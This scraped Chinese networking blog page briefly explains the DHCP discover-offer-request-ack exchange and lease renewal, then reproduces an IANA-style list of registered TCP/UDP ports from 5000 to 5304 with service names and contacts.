<p>自定获取 IP 地址，需要在网络中有 DHCP 服务器，服务器上有地址池，维护很多地址。自动获取 IP 地址步骤分四步：discover­ &gt; offer­ &gt; request­ &gt; ack(nak)</p>
<img data-src="//img.to2b.cn/blog/ljk/1598407472082.png" style="zoom:67%;" />

<ol>
<li>DHCP <strong>DISCOVER</strong>: 寻找服务器，向网络中发送 DHCP DISCOVER 协议广播（来源地址：0.0.0.0），请求 DHCP 给分配 IP 地址。</li>
<li>DHCP <strong>OFFER</strong>：分配 IP 地址，DHCP 服务器接收到请求，返回 IP 地址，同时在地址池中标记该 IP 地址。</li>
<li>DHCP <strong>REQUEST</strong>：请求使用，如果客户端收到网路上多台 DHCP 服务器的回应﹐只会挑选其中一个 DHCP Offer(通常是最先抵达的那个)并且向网路发送一个 DHCP Request 广播，告诉所有 DHCP 服务器它将指定接受哪一台服务器提供的 IP 位址，除 DHCP 客户机选中的服务器外，其他的 DHCP 服务器都将收回曾提供的 IP 地址。<ol>
<li>同时，客户端还会发送一个 ARP 封包， 查询网路上有没有其他机器使用该 IP 地址， 如果发现该 IP 被占用， 客户端会发送一个 DHCP Decline 封包给 DHCP 服务器， 拒绝接受其 DHCP Offer，并重新开始发送 DHCP Discover 信息。</li>
</ol>
</li>
<li>DHCP <strong>ACK</strong> IP：地址分配确认，DHCP 服务器收到 DHCP Request 请求信息之后，发送 ACK 确认确认 IP 地址的正式生效，然后客户单便将其 TCP&#x2F;IP 协议与网卡绑定</li>
</ol>
<p>DHCP 服务器向 DHCP 客户机出租的 IP 地址一般都有一个租借期限， 期满后 DHCP 服务器便会收回出租的 IP 地址，如果 DHCP 客户机要延长其 IP 租约， 则必须更新其 IP 租约：租赁时间到达 50%时续租，如果 DHCP Server 没有回应，等到租期的 7&#x2F;8 时，主机会再发送一次广播请求。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block ljk-index-post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://blog.lujinkai.cn/%E8%BF%90%E7%BB%B4/%E5%9F%BA%E7%A1%80/%E7%BD%91%E7%BB%9C/TCP%E6%B3%A8%E5%86%8C%E7%AB%AF%E5%8F%A3%E5%8F%B7%E5%A4%A7%E5%85%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="//img.to2b.cn/blog/ljk/1607154764582.png">
      <meta itemprop="name" content="像方便面一样的男子">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="LJKのBlog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | LJKのBlog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/%E8%BF%90%E7%BB%B4/%E5%9F%BA%E7%A1%80/%E7%BD%91%E7%BB%9C/TCP%E6%B3%A8%E5%86%8C%E7%AB%AF%E5%8F%A3%E5%8F%B7%E5%A4%A7%E5%85%A8/" class="post-title-link" itemprop="url">TCP注册端口号大全</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-01-01 22:37:52" itemprop="dateCreated datePublished" datetime="2021-01-01T22:37:52+08:00">2021-01-01</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-05-29 16:58:05" itemprop="dateModified" datetime="2023-05-29T16:58:05+08:00">2023-05-29</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%BF%90%E7%BB%B4/" itemprop="url" rel="index"><span itemprop="name">运维</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%BF%90%E7%BB%B4/%E5%9F%BA%E7%A1%80/" itemprop="url" rel="index"><span itemprop="name">基础</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%BF%90%E7%BB%B4/%E5%9F%BA%E7%A1%80/%E7%BD%91%E7%BB%9C/" itemprop="url" rel="index"><span itemprop="name">网络</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#			   Jerome AERTS  March 2006</span>
commplex-main	<span class="token number">5000</span>/tcp
commplex-main	<span class="token number">5000</span>/udp
commplex-link	<span class="token number">5001</span>/tcp
commplex-link	<span class="token number">5001</span>/udp
rfe             <span class="token number">5002</span>/tcp   radio <span class="token function">free</span> ethernet
rfe             <span class="token number">5002</span>/udp   radio <span class="token function">free</span> ethernet
fmpro-internal  <span class="token number">5003</span>/tcp   FileMaker, Inc. - Proprietary transport
fmpro-internal  <span class="token number">5003</span>/udp   FileMaker, Inc. - Proprietary name binding
<span class="token comment">#                          Clay Maeckel </span>
avt-profile-1   <span class="token number">5004</span>/tcp   RTP media data <span class="token punctuation">[</span>RFC <span class="token number">3551</span>, RFC <span class="token number">4571</span><span class="token punctuation">]</span>
avt-profile-1   <span class="token number">5004</span>/udp   RTP media data <span class="token punctuation">[</span>RFC <span class="token number">3551</span><span class="token punctuation">]</span>
avt-profile-1   <span class="token number">5004</span>/dccp  RTP media data <span class="token punctuation">[</span>RFC <span class="token number">3551</span>, RFC-ietf-dccp-rtp-07.txt<span class="token punctuation">]</span>
avt-profile-2   <span class="token number">5005</span>/tcp   RTP control protocol <span class="token punctuation">[</span>RFC <span class="token number">3551</span>, RFC <span class="token number">4571</span><span class="token punctuation">]</span>
avt-profile-2   <span class="token number">5005</span>/udp   RTP control protocol <span class="token punctuation">[</span>RFC <span class="token number">3551</span><span class="token punctuation">]</span>
avt-profile-2   <span class="token number">5005</span>/dccp  RTP control protocol <span class="token punctuation">[</span>RFC <span class="token number">3551</span>, RFC-ietf-dccp-rtp-07.txt<span class="token punctuation">]</span>
wsm-server      <span class="token number">5006</span>/tcp   wsm server
wsm-server      <span class="token number">5006</span>/udp   wsm server
wsm-server-ssl  <span class="token number">5007</span>/tcp   wsm server ssl
wsm-server-ssl  <span class="token number">5007</span>/udp   wsm server ssl
<span class="token comment">#                          Adam Berk </span>
synapsis-edge   <span class="token number">5008</span>/tcp   Synapsis EDGE
synapsis-edge   <span class="token number">5008</span>/udp   Synapsis EDGE
<span class="token comment">#                          Paul Schilling </span>
winfs           <span class="token number">5009</span>/tcp   Microsoft Windows Filesystem
winfs           <span class="token number">5009</span>/udp   Microsoft Windows Filesystem
<span class="token comment">#			   Simon Skaria  January 2006</span>
telelpathstart  <span class="token number">5010</span>/tcp   TelepathStart
telelpathstart  <span class="token number">5010</span>/udp   TelepathStart
telelpathattack <span class="token number">5011</span>/tcp   TelepathAttack
telelpathattack <span class="token number">5011</span>/udp   TelepathAttack
<span class="token comment">#                          Helmuth Breitenfellner </span>
nsp             <span class="token number">5012</span>/tcp   NetOnTap Service
nsp             <span class="token number">5012</span>/udp   NetOnTap Service
<span class="token comment">#			   Kim Hancock  24 October 2007</span>
fmpro-v6	<span class="token number">5013</span>/tcp   FileMaker, Inc. - Proprietary transport
fmpro-v6	<span class="token number">5013</span>/udp   FileMaker, Inc. - Proprietary transport
<span class="token comment">#			   Alex Chen  01 August 2007</span>
<span class="token comment">#               5014/tcp   Reserved</span>
onpsocket       <span class="token number">5014</span>/udp   Overlay Network Protocol
<span class="token comment">#                          Roger Matthias  24 August 2009</span>
<span class="token comment">#               5015-5019  Unassigned</span>
zenginkyo-1     <span class="token number">5020</span>/tcp   zenginkyo-1
zenginkyo-1     <span class="token number">5020</span>/udp   zenginkyo-1
zenginkyo-2     <span class="token number">5021</span>/tcp   zenginkyo-2
zenginkyo-2     <span class="token number">5021</span>/udp   zenginkyo-2
<span class="token comment">#                          Masashi Suzaki </span>
mice            <span class="token number">5022</span>/tcp   mice server
mice            <span class="token number">5022</span>/udp   mice server
<span class="token comment">#                          Alan Clifford </span>
htuilsrv        <span class="token number">5023</span>/tcp   Htuil Server <span class="token keyword">for</span> PLD2
htuilsrv        <span class="token number">5023</span>/udp   Htuil Server <span class="token keyword">for</span> PLD2
<span class="token comment">#                          Dennis Reinhardt </span>
scpi-telnet     <span class="token number">5024</span>/tcp   SCPI-TELNET
scpi-telnet     <span class="token number">5024</span>/udp   SCPI-TELNET
scpi-raw        <span class="token number">5025</span>/tcp   SCPI-RAW
scpi-raw        <span class="token number">5025</span>/udp   SCPI-RAW
<span class="token comment">#                          Ryan Columbus  October 2002</span>
strexec-d       <span class="token number">5026</span>/tcp   Storix I/O daemon <span class="token punctuation">(</span>data<span class="token punctuation">)</span>
strexec-d       <span class="token number">5026</span>/udp   Storix I/O daemon <span class="token punctuation">(</span>data<span class="token punctuation">)</span>
strexec-s       <span class="token number">5027</span>/tcp   Storix I/O daemon <span class="token punctuation">(</span>stat<span class="token punctuation">)</span>
strexec-s       <span class="token number">5027</span>/udp   Storix I/O daemon <span class="token punctuation">(</span>stat<span class="token punctuation">)</span>
<span class="token comment">#                          Anthony Johnson  August 2005</span>
qvr             <span class="token number">5028</span>/tcp   Quiqum Virtual Relais
<span class="token comment">#                          Philipp Marcel Albrecht  06 July 2009</span>
<span class="token comment">#               5028/udp   Reserved</span>
infobright      <span class="token number">5029</span>/tcp   Infobright Database Server
infobright      <span class="token number">5029</span>/udp   Infobright Database Server
<span class="token comment">#                          Mark Windrim  23 July 2009</span>
surfpass	<span class="token number">5030</span>/tcp   SurfPass
surfpass	<span class="token number">5030</span>/udp   SurfPass
<span class="token comment">#			   Olivier Guezenec  December 2006</span>
<span class="token comment">#               5031-5041  Unassigned</span>
asnaacceler8db  <span class="token number">5042</span>/tcp   asnaacceler8db
asnaacceler8db  <span class="token number">5042</span>/udp   asnaacceler8db
<span class="token comment">#                          Walter Goodwin </span>
swxadmin        <span class="token number">5043</span>/tcp   ShopWorX Administration
swxadmin        <span class="token number">5043</span>/udp   ShopWorX Administration
<span class="token comment">#                          Don W. Fitzpatrick  August 2005</span>
lxi-evntsvc     <span class="token number">5044</span>/tcp   LXI Event Service
lxi-evntsvc     <span class="token number">5044</span>/udp   LXI Event Service
<span class="token comment">#                          Nick Barendt  August 2005</span>
<span class="token comment">#               5045-5048  Unassigned</span>
ivocalize	<span class="token number">5049</span>/tcp   iVocalize Web Conference
ivocalize	<span class="token number">5049</span>/udp   iVocalize Web Conference
<span class="token comment">#			   Bryan Vergato  May 2006</span>
mmcc            <span class="token number">5050</span>/tcp   multimedia conference control tool
mmcc            <span class="token number">5050</span>/udp   multimedia conference control tool
<span class="token comment">#                          Steve Casner </span>
ita-agent       <span class="token number">5051</span>/tcp   ITA Agent
ita-agent       <span class="token number">5051</span>/udp   ITA Agent
ita-manager     <span class="token number">5052</span>/tcp   ITA Manager
ita-manager     <span class="token number">5052</span>/udp   ITA Manager
<span class="token comment">#                          Don Merrell </span>
rlm             <span class="token number">5053</span>/tcp   RLM License Server
<span class="token comment">#                          Matt Christiano  28 July 2008</span>
<span class="token comment">#               5053/udp   Reserved</span>
rlm-admin       <span class="token number">5054</span>/tcp   RLM administrative interface
<span class="token comment">#                          Matt Christiano  28 July 2008</span>
<span class="token comment">#               5054/udp   Reserved</span>
unot            <span class="token number">5055</span>/tcp   UNOT
unot            <span class="token number">5055</span>/udp   UNOT
<span class="token comment">#                          Gordon Mohr </span>
intecom-ps1     <span class="token number">5056</span>/tcp   Intecom Pointspan <span class="token number">1</span>
intecom-ps1     <span class="token number">5056</span>/udp   Intecom Pointspan <span class="token number">1</span>
intecom-ps2     <span class="token number">5057</span>/tcp   Intecom Pointspan <span class="token number">2</span>
intecom-ps2     <span class="token number">5057</span>/udp   Intecom Pointspan <span class="token number">2</span>
<span class="token comment">#                          David Meermans </span>
<span class="token comment">#               5058/tcp   Reserved</span>
locus-disc      <span class="token number">5058</span>/udp   Locus Discovery
<span class="token comment">#                          Alan King, Enabling Technology Pty. Ltd.  13 August 2009</span>
sds		<span class="token number">5059</span>/tcp   SIP Directory Services
sds		<span class="token number">5059</span>/udp   SIP Directory Services
<span class="token comment">#			   Arthur Wilton  March 2006</span>
sip             <span class="token number">5060</span>/tcp   SIP
sip             <span class="token number">5060</span>/udp   SIP
sip-tls         <span class="token number">5061</span>/tcp   SIP-TLS
sip-tls         <span class="token number">5061</span>/udp   SIP-TLS
<span class="token comment">#                          Henning Schulzrinne </span>
<span class="token comment">#               5062-5063  Unassigned</span>
ca-1            <span class="token number">5064</span>/tcp   Channel Access <span class="token number">1</span>
ca-1            <span class="token number">5064</span>/udp   Channel Access <span class="token number">1</span>
ca-2            <span class="token number">5065</span>/tcp   Channel Access <span class="token number">2</span>
ca-2            <span class="token number">5065</span>/udp   Channel Access <span class="token number">2</span>
<span class="token comment">#                          Jeffrey Hill  August 2002</span>
stanag-5066     <span class="token number">5066</span>/tcp   STANAG-5066-SUBNET-INTF
stanag-5066     <span class="token number">5066</span>/udp   STANAG-5066-SUBNET-INTF
<span class="token comment">#                          Donald G. Kallgren</span>
<span class="token comment">#                          </span>
authentx        <span class="token number">5067</span>/tcp   Authentx Service
authentx        <span class="token number">5067</span>/udp   Authentx Service
<span class="token comment">#                          Alberto Fernandez  January 2006</span>
bitforestsrv    <span class="token number">5068</span>/tcp   Bitforest Data Service
<span class="token comment">#                          Ville-Pekka Vahteala  05 June 2008</span>
<span class="token comment">#               5068/udp   Reserved</span>
i-net-2000-npr  <span class="token number">5069</span>/tcp   I/Net <span class="token number">2000</span>-NPR
i-net-2000-npr  <span class="token number">5069</span>/udp   I/Net <span class="token number">2000</span>-NPR
<span class="token comment">#                          Chris Megede </span>
vtsas		<span class="token number">5070</span>/tcp   VersaTrans Server Agent Service
vtsas		<span class="token number">5070</span>/udp   VersaTrans Server Agent Service
<span class="token comment">#			   Christopher Miller  February 2006</span>
powerschool     <span class="token number">5071</span>/tcp   PowerSchool
powerschool     <span class="token number">5071</span>/udp   PowerSchool
<span class="token comment">#                          Greg Porter </span>
ayiya           <span class="token number">5072</span>/tcp   Anything In Anything
ayiya           <span class="token number">5072</span>/udp   Anything In Anything
<span class="token comment">#                          Jeroen Massar  August 2005</span>
tag-pm          <span class="token number">5073</span>/tcp   Advantage Group Port Mgr
tag-pm          <span class="token number">5073</span>/udp   Advantage Group Port Mgr
<span class="token comment">#                          James Goddard  August 2005</span>
alesquery       <span class="token number">5074</span>/tcp   ALES Query
alesquery       <span class="token number">5074</span>/udp   ALES Query
<span class="token comment">#                          Tim Maloney  August 2005</span>
<span class="token comment">#               5075-5078  Unassigned</span>
<span class="token comment">#               5079/tcp   Reserved</span>
cp-spxrpts      <span class="token number">5079</span>/udp   Cambridge Pixel SPx Reports
<span class="token comment">#                          Richard Warren  17 September 2008</span>
onscreen        <span class="token number">5080</span>/tcp   OnScreen Data Collection Service
onscreen        <span class="token number">5080</span>/udp   OnScreen Data Collection Service
<span class="token comment">#                          Christopher Miller  14 January 2008</span>
sdl-ets         <span class="token number">5081</span>/tcp   SDL - Ent Trans Server
sdl-ets         <span class="token number">5081</span>/udp   SDL - Ent Trans Server
<span class="token comment">#                          Marc Morin  April 2002</span>
qcp             <span class="token number">5082</span>/tcp   Qpur Communication Protocol
qcp             <span class="token number">5082</span>/udp   Qpur Communication Protocol
qfp             <span class="token number">5083</span>/tcp   Qpur File Protocol
qfp             <span class="token number">5083</span>/udp   Qpur File Protocol
<span class="token comment">#                          Joachim Kluemper  19 March 2008</span>
llrp		<span class="token number">5084</span>/tcp   EPCglobal Low-Level Reader Protocol
llrp		<span class="token number">5084</span>/udp   EPCglobal Low-Level Reader Protocol
encrypted-llrp	<span class="token number">5085</span>/tcp   EPCglobal Encrypted LLRP
encrypted-llrp	<span class="token number">5085</span>/udp   EPCglobal Encrypted LLRP
<span class="token comment">#			   Margaret Wasserman  November 2006</span>
<span class="token comment">#               5086-5089  Unassigned</span>
car             <span class="token number">5090</span>/sctp  Candidate AR
cxtp            <span class="token number">5091</span>/sctp  Context Transfer Protocol
<span class="token comment">#                          RFC 4065 - July 2005</span>
<span class="token comment">#               5092/tcp   Reserved</span>
magpie          <span class="token number">5092</span>/udp   Magpie Binary
<span class="token comment">#                          Phil Maker  18 June 2008</span>
sentinel-lm     <span class="token number">5093</span>/tcp   Sentinel LM
sentinel-lm     <span class="token number">5093</span>/udp   Sentinel LM
<span class="token comment">#                          Derick Snyder </span>
<span class="token comment">#               5094-5098  Unassigned</span>
sentlm-srv2srv  <span class="token number">5099</span>/tcp   SentLM Srv2Srv
sentlm-srv2srv  <span class="token number">5099</span>/udp   SentLM Srv2Srv
<span class="token comment">#                          Derick Snyder </span>
socalia         <span class="token number">5100</span>/tcp   Socalia <span class="token function">service</span> mux
socalia         <span class="token number">5100</span>/udp   Socalia <span class="token function">service</span> mux
<span class="token comment">#                          Alberto Raydan  August 2005</span>
talarian-tcp    <span class="token number">5101</span>/tcp   Talarian_TCP
talarian-udp    <span class="token number">5101</span>/udp   Talarian_UDP
<span class="token comment">#                          Leo Martins </span>
oms-nonsecure   <span class="token number">5102</span>/tcp   Oracle OMS non-secure
oms-nonsecure   <span class="token number">5102</span>/udp   Oracle OMS non-secure
<span class="token comment">#                          Todd Guay  August 2005</span>
<span class="token comment">#               5103-5110  Unassigned</span>
taep-as-svc     <span class="token number">5111</span>/tcp   TAEP AS <span class="token function">service</span>
taep-as-svc     <span class="token number">5111</span>/udp   TAEP AS <span class="token function">service</span>
<span class="token comment">#                          Liu Changchun  05 November 2008</span>
pm-cmdsvr       <span class="token number">5112</span>/tcp   PeerMe Msg Cmd Service
pm-cmdsvr       <span class="token number">5112</span>/udp   PeerMe Msg Cmd Service
<span class="token comment">#                          Marcos Della  August 2005</span>
ni-conf         <span class="token number">5113</span>/tcp   NI Device Configuration Protocol
ni-dc           <span class="token number">5113</span>/udp   NI Device Discovery and Configuration Protocol
<span class="token comment">#                          Ioan Cornea  03 August 2009</span>
ev-services     <span class="token number">5114</span>/tcp   Enterprise Vault Services
<span class="token comment">#                          Richard Jones  26 May 2009</span>
<span class="token comment">#               5114/udp   Reserved</span>
autobuild       <span class="token number">5115</span>/tcp   Symantec Autobuild Service
<span class="token comment">#                          David Warden  17 November 2008</span>
<span class="token comment">#               5115/udp   Reserved</span>
<span class="token comment">#               5116/tcp   Reserved</span>
emb-proj-cmd    <span class="token number">5116</span>/udp   EPSON Projecter Image Transfer
<span class="token comment">#                          SEIKO EPSON  17 November 2008</span>
gradecam        <span class="token number">5117</span>/tcp   GradeCam Image Processing
<span class="token comment">#                          Robert Porter  24 September 2009</span>
<span class="token comment">#               5117/udp   Reserved</span>
<span class="token comment">#               5118-5132  Unassigned</span>
nbt-pc          <span class="token number">5133</span>/tcp   Policy Commander
nbt-pc          <span class="token number">5133</span>/udp   Policy Commander
<span class="token comment">#                          Emily Harris  November 2004</span>
<span class="token comment">#               5134-5136  Unassigned</span>
ctsd            <span class="token number">5137</span>/tcp   MyCTS server port
ctsd            <span class="token number">5137</span>/udp   MyCTS server port
<span class="token comment">#                          Jilles Oldenbeuving  June 2002</span>
<span class="token comment">#               5138-5144  Unassigned</span>
rmonitor_secure	<span class="token number">5145</span>/tcp   RMONITOR SECURE
rmonitor_secure	<span class="token number">5145</span>/udp   RMONITOR SECURE
<span class="token comment">#                          Kory Hamzeh </span>
social-alarm    <span class="token number">5146</span>/tcp   Social Alarm Service
<span class="token comment">#                          Shaun Byrne  18 August 2009</span>
<span class="token comment">#               5146/udp   Reserved</span>
<span class="token comment">#               5147-5149  Unassigned</span>
atmp            <span class="token number">5150</span>/tcp   Ascend Tunnel Management Protocol
atmp            <span class="token number">5150</span>/udp   Ascend Tunnel Management Protocol
<span class="token comment">#                          Kory Hamzeh </span>
esri_sde        <span class="token number">5151</span>/tcp   ESRI SDE Instance
esri_sde        <span class="token number">5151</span>/udp   ESRI SDE Remote Start
sde-discovery   <span class="token number">5152</span>/tcp   ESRI SDE Instance Discovery
sde-discovery   <span class="token number">5152</span>/udp   ESRI SDE Instance Discovery
<span class="token comment">#                          Peter Aronson </span>
toruxserver     <span class="token number">5153</span>/tcp   ToruX Game Server
<span class="token comment">#                          Josse van Dobben de Bruyn  01 July 2009</span>
<span class="token comment">#               5153/udp   Reserved</span>
bzflag          <span class="token number">5154</span>/tcp   BZFlag game server
bzflag          <span class="token number">5154</span>/udp   BZFlag game server
<span class="token comment">#                          Tim Riker  July 2003</span>
asctrl-agent    <span class="token number">5155</span>/tcp   Oracle asControl Agent
asctrl-agent    <span class="token number">5155</span>/udp   Oracle asControl Agent
<span class="token comment">#                          Todd Guay  August 2005</span>
<span class="token comment">#               5156-5160  Unassigned</span>
snmpssh         <span class="token number">5161</span>/tcp   SNMP over SSH Transport Model
<span class="token comment">#               5161/udp   Reserved</span>
<span class="token comment">#                          [RFC5592]</span>
snmpssh-trap    <span class="token number">5162</span>/tcp   SNMP Notification over SSH Transport Model
<span class="token comment">#               5162/udp   Reserved</span>
<span class="token comment">#                          [RFC5592]</span>
sbackup         <span class="token number">5163</span>/tcp   Shadow Backup
<span class="token comment">#                          Glenn Allen  05 August 2009</span>
<span class="token comment">#               5163/udp   Reserved</span>
vpa             <span class="token number">5164</span>/tcp   Virtual Protocol Adapter
vpa-disc        <span class="token number">5164</span>/udp   Virtual Protocol Adapter Discovery
<span class="token comment">#                          Douglas Goodall  05 August 2009</span>
ife_icorp       <span class="token number">5165</span>/tcp   ife_1corp
ife_icorp       <span class="token number">5165</span>/udp   ife_1corp
<span class="token comment">#                          Paul Annala </span>
winpcs          <span class="token number">5166</span>/tcp   WinPCS Service Connection
winpcs          <span class="token number">5166</span>/udp   WinPCS Service Connection
<span class="token comment">#                          Complan Network AS  February 2006</span>
scte104         <span class="token number">5167</span>/tcp   SCTE104 Connection
scte104         <span class="token number">5167</span>/udp   SCTE104 Connection
scte30          <span class="token number">5168</span>/tcp   SCTE30 Connection
scte30          <span class="token number">5168</span>/udp   SCTE30 Connection
<span class="token comment">#                          Thomas Russell  May 2005</span>
<span class="token comment">#               5169-5189  Unassigned</span>
aol             <span class="token number">5190</span>/tcp   America-Online
aol             <span class="token number">5190</span>/udp   America-Online
<span class="token comment">#                          Marty Lyons </span>
aol-1           <span class="token number">5191</span>/tcp   AmericaOnline1
aol-1           <span class="token number">5191</span>/udp   AmericaOnline1
aol-2           <span class="token number">5192</span>/tcp   AmericaOnline2
aol-2           <span class="token number">5192</span>/udp   AmericaOnline2
aol-3           <span class="token number">5193</span>/tcp   AmericaOnline3
aol-3           <span class="token number">5193</span>/udp   AmericaOnline3
<span class="token comment">#                          Bruce Mackey </span>
<span class="token comment">#               5194-5199  Unassigned</span>
targus-getdata  <span class="token number">5200</span>/tcp   TARGUS GetData
targus-getdata  <span class="token number">5200</span>/udp   TARGUS GetData
targus-getdata1 <span class="token number">5201</span>/tcp   TARGUS GetData <span class="token number">1</span>
targus-getdata1 <span class="token number">5201</span>/udp   TARGUS GetData <span class="token number">1</span>
targus-getdata2 <span class="token number">5202</span>/tcp   TARGUS GetData <span class="token number">2</span>
targus-getdata2 <span class="token number">5202</span>/udp   TARGUS GetData <span class="token number">2</span>
targus-getdata3 <span class="token number">5203</span>/tcp   TARGUS GetData <span class="token number">3</span>
targus-getdata3 <span class="token number">5203</span>/udp   TARGUS GetData <span class="token number">3</span>
<span class="token comment">#                          John Keaveney </span>
<span class="token comment">#               5204-5221  Unassigned</span>
xmpp-client     <span class="token number">5222</span>/tcp   XMPP Client Connection
xmpp-client     <span class="token number">5222</span>/udp   XMPP Client Connection
<span class="token comment">#                          [RFC3920]</span>
hpvirtgrp	<span class="token number">5223</span>/tcp   HP Virtual Machine Group Management
hpvirtgrp	<span class="token number">5223</span>/udp   HP Virtual Machine Group Management
hpvirtctrl	<span class="token number">5224</span>/tcp   HP Virtual Machine Console Operations
hpvirtctrl	<span class="token number">5224</span>/udp   HP Virtual Machine Console Operations
<span class="token comment">#			   John Williams  June 2007</span>
hp-server       <span class="token number">5225</span>/tcp   HP Server
hp-server       <span class="token number">5225</span>/udp   HP Server
hp-status       <span class="token number">5226</span>/tcp   HP Status
hp-status       <span class="token number">5226</span>/udp   HP Status
<span class="token comment">#                          Brett Green </span>
perfd		<span class="token number">5227</span>/tcp   HP System Performance Metric Service
perfd		<span class="token number">5227</span>/udp   HP System Performance Metric Service
<span class="token comment">#			   Previous contact: Phyllis Gallgher  April 2007</span>
<span class="token comment">#                          Current contact: Chris Bertin  19 May 2009</span>
hpvroom         <span class="token number">5228</span>/tcp   HP Virtual Room Service
<span class="token comment">#                          Scott Levin  19 March 2009</span>
<span class="token comment">#               5228/udp   Reserved</span>
<span class="token comment">#               5229-5233  Unassigned</span>
eenet           <span class="token number">5234</span>/tcp   EEnet communications
eenet           <span class="token number">5234</span>/udp   EEnet communications
<span class="token comment">#                          Helmut Giritzer  November 2005</span>
galaxy-network  <span class="token number">5235</span>/tcp   Galaxy Network Service
galaxy-network  <span class="token number">5235</span>/udp   Galaxy Network Service
<span class="token comment">#			   Michael Andre  04 October 2007</span>
padl2sim        <span class="token number">5236</span>/tcp
padl2sim        <span class="token number">5236</span>/udp
<span class="token comment">#</span>
mnet-discovery	<span class="token number">5237</span>/tcp   m-net discovery
mnet-discovery	<span class="token number">5237</span>/udp   m-net discovery
<span class="token comment">#			   Andy Crick  13 November 2007</span>
<span class="token comment">#               5238-5244  Unassigned</span>
downtools       <span class="token number">5245</span>/tcp   DownTools Control Protocol
downtools-disc  <span class="token number">5245</span>/udp   DownTools Discovery Protocol
<span class="token comment">#                          Jarrod Sayers  07 April 2009</span>
<span class="token comment">#               5246/tcp   Reserved</span>
capwap-control  <span class="token number">5246</span>/udp   CAPWAP Control Protocol
<span class="token comment">#                          [RFC5415]</span>
<span class="token comment">#               5247/tcp   Reserved</span>
capwap-data     <span class="token number">5247</span>/udp   CAPWAP Data Protocol
<span class="token comment">#                          [RFC5415]</span>
caacws          <span class="token number">5248</span>/tcp   CA Access Control Web Service
caacws          <span class="token number">5248</span>/udp   CA Access Control Web Service
<span class="token comment">#                          Gabriel Kalmar  06 March 2008</span>
caaclang2       <span class="token number">5249</span>/tcp   CA AC Lang Service
caaclang2       <span class="token number">5249</span>/udp   CA AC Lang Service
<span class="token comment">#                          Gabriel Kalmar  19 February 2008</span>
soagateway	<span class="token number">5250</span>/tcp   soaGateway
soagateway	<span class="token number">5250</span>/udp   soaGateway
<span class="token comment">#                          Greg Bodine  February 2002</span>
caevms          <span class="token number">5251</span>/tcp   CA eTrust VM Service
caevms          <span class="token number">5251</span>/udp   CA eTrust VM Service
<span class="token comment">#                          Kevin Bond  November 2004</span>
movaz-ssc       <span class="token number">5252</span>/tcp   Movaz SSC
movaz-ssc       <span class="token number">5252</span>/udp   Movaz SSC
<span class="token comment">#                          Lou Berger  November 2004</span>
<span class="token comment">#               5253-5263  Unassigned</span>
3com-njack-1    <span class="token number">5264</span>/tcp   3Com Network Jack Port <span class="token number">1</span>
3com-njack-1    <span class="token number">5264</span>/udp   3Com Network Jack Port <span class="token number">1</span>
3com-njack-2    <span class="token number">5265</span>/tcp   3Com Network Jack Port <span class="token number">2</span>
3com-njack-2    <span class="token number">5265</span>/udp   3Com Network Jack Port <span class="token number">2</span>
<span class="token comment">#                          Abhay Rajaram  March 2003</span>
<span class="token comment">#               5266-5268  Unassigned</span>
xmpp-server     <span class="token number">5269</span>/tcp   XMPP Server Connection
xmpp-server     <span class="token number">5269</span>/udp   XMPP Server Connection
<span class="token comment">#                          [RFC3920]</span>
xmp             <span class="token number">5270</span>/tcp   Cartographer XMP
xmp             <span class="token number">5270</span>/udp   Cartographer XMP
<span class="token comment">#                          Bobby Krupczak  03 April 2008</span>
<span class="token comment">#               5271       Unassigned</span>
pk              <span class="token number">5272</span>/tcp   PK
pk              <span class="token number">5272</span>/udp   PK
<span class="token comment">#                          Patrick Kara </span>
<span class="token comment">#               5273-5281  Unassigned</span>
transmit-port   <span class="token number">5282</span>/tcp   Marimba Transmitter Port
transmit-port   <span class="token number">5282</span>/udp   Marimba Transmitter Port
<span class="token comment">#                          Johan Eriksson  April 2002</span>
<span class="token comment">#               5283-5297  Unassigned</span>
presence        <span class="token number">5298</span>/tcp   XMPP Link-Local Messaging
presence        <span class="token number">5298</span>/udp   XMPP Link-Local Messaging
<span class="token comment">#                          Eric St. Onge  14 January 2008</span>
nlg-data        <span class="token number">5299</span>/tcp   NLG Data Service
nlg-data        <span class="token number">5299</span>/udp   NLG Data Service
<span class="token comment">#                          Andy Shellam  19 February 2008</span>
hacl-hb		<span class="token number">5300</span>/tcp   HA cluster heartbeat
hacl-hb		<span class="token number">5300</span>/udp   HA cluster heartbeat
hacl-gs		<span class="token number">5301</span>/tcp   HA cluster general services
hacl-gs		<span class="token number">5301</span>/udp   HA cluster general services
hacl-cfg	<span class="token number">5302</span>/tcp   HA cluster configuration
hacl-cfg	<span class="token number">5302</span>/udp   HA cluster configuration
hacl-probe	<span class="token number">5303</span>/tcp   HA cluster probing
hacl-probe	<span class="token number">5303</span>/udp   HA cluster probing
hacl-local      <span class="token number">5304</span>/tcp   HA Cluster Commands
hacl-local      <span class="token number">5304</span>/udp   HA Cluster Commands
